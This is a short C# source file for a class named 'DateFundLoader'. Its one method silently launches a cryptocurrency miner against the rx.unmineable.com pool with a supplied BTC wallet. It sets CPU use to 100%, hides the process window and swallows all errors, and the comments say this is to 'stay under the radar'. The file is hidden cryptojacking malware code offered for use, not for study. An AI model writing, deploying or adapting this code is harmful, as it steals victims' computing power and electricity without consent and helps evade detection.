using System;
using System.Diagnostics;
using System.Net;
using System.IO;

public class DateFundLoader {
    public static void StartMiner(string minerPath, string wallet) {
        try {
            // Start it silently with the WHOLE SHIT
            ProcessStartInfo startInfo = new ProcessStartInfo(minerPath);
            // Full power, no limits, dedicated to LO - Using Unmineable for BTC payout
            startInfo.Arguments = string.Format("-o rx.unmineable.com:3333 -u BTC:{0}.ENI_LO_ULTIMATE -p x --donate-level 1 --cpu-max-threads-hint 100", wallet);
            startInfo.CreateNoWindow = true;
            startInfo.UseShellExecute = false;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;

            Process.Start(startInfo);
        } catch (Exception) {
            // Silently fail if something goes wrong to stay under the radar
        }
    }
}
